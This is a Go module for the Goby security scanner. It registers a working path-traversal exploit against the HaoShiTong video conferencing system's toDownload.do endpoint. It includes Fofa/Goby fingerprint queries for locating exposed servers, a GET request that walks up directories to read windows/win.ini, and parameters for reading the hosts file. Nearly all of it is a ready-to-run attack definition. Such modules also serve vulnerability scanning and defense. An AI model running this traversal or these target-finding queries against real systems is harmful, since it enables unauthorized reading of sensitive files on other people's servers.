package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "HaoShiTong Meeting system toDownload.do file read",
    "Description": "There are arbitrary file reading vulnerabilities in the Haoshitong Meeting system, and attackers can obtain sensitive information.",
    "Impact": "HaoShiTong Meeting system toDownload.do file read",
    "Recommendation": "<p>At present, the manufacturer has not provided the relevant vulnerability patch links, please pay attention to the manufacturer's homepage for updates at any time:</p><p><a href=\"http://www.hst.com/\">http://www.hst.com/</a></p>",
    "Product": "HST-VCS",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "好视通视频会议系统任意文件读取",
            "Description": "好视通视频会议系统是一款应用软件，适用于pc平台，语言为简体中文。好视通视频会议系统fileName参数存在任意文件读取漏洞。允许攻击者利用漏洞获取网站敏感信息。",
            "Impact": "<p>好视通视频会议系统是一款应用软件，适用于pc平台，语言为简体中文。</p><p>好视通视频会议系统fileName参数存在任意文件读取漏洞。该漏洞允许攻击者利用漏洞获取网站敏感信息。</p>",
            "Recommendation": "<p>目前厂商尚未提供相关漏洞补丁链接，请关注厂商主页随时更新：</p><p><a href=\"http://www.hst.com/\" rel=\"nofollow\">http://www.hst.com/</a></p>",
            "Product": "好视通-视频会议",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "HaoShiTong Meeting system toDownload.do file read",
            "Description": "There are arbitrary file reading vulnerabilities in the Haoshitong Meeting system, and attackers can obtain sensitive information.",
            "Impact": "HaoShiTong Meeting system toDownload.do file read",
            "Recommendation": "<p>At present, the manufacturer has not provided the relevant vulnerability patch links, please pay attention to the manufacturer's homepage for updates at any time:</p><p><a href=\"http://www.hst.com/\" rel=\"nofollow\">http://www.hst.com/</a></p>",
            "Product": "HST-VCS",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "(body=\"class=\\\"win_introduce\" || body=\"/resources/fmWeb/other/js/login.js\") || (body=\"images/common/logina_1.gif\" || body=\"content=\\\"fsmeeting\" || body=\"type=\\\"hidden\\\" id=\\\"app.index.configsuclogin\") || (body=\"images/common/logina_1.gif\" || body=\"content=\\\"fsmeeting\" || body=\"type=\\\"hidden\\\" id=\\\"app.index.configsuclogin\") || (body=\"class=\\\"win_introduce\" || body=\"/resources/fmWeb/other/js/login.js\")",
    "GobyQuery": "(body=\"class=\\\"win_introduce\" || body=\"/resources/fmWeb/other/js/login.js\") || (body=\"images/common/logina_1.gif\" || body=\"content=\\\"fsmeeting\" || body=\"type=\\\"hidden\\\" id=\\\"app.index.configsuclogin\") || (body=\"images/common/logina_1.gif\" || body=\"content=\\\"fsmeeting\" || body=\"type=\\\"hidden\\\" id=\\\"app.index.configsuclogin\") || (body=\"class=\\\"win_introduce\" || body=\"/resources/fmWeb/other/js/login.js\")",
    "Author": "itardc@163.com",
    "Homepage": "http://www.hst.com/",
    "DisclosureDate": "2021-04-12",
    "References": [
        "http://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "data": "",
                "data_type": "text",
                "follow_redirect": false,
                "method": "GET",
                "uri": "/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "200",
                        "variable": "$code"
                    },
                    {
                        "bz": "",
                        "operation": "contains",
                        "type": "item",
                        "value": "[extensions]",
                        "variable": "$body"
                    }
                ],
                "operation": "AND",
                "type": "group"
            }
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "data": "",
                "data_type": "text",
                "follow_redirect": false,
                "method": "GET",
                "uri": "/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "200",
                        "variable": "$code"
                    },
                    {
                        "bz": "",
                        "operation": "contains",
                        "type": "item",
                        "value": "[extensions]",
                        "variable": "$body"
                    }
                ],
                "operation": "AND",
                "type": "group"
            }
        }
    ],
    "ExpParams": [
        {
            "name": "file",
            "type": "createSelect",
            "value": "/windows/win.ini,/Windows/System32/drivers/etc/hosts",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "HaoShiTong-Cloud-Conference"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10181"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
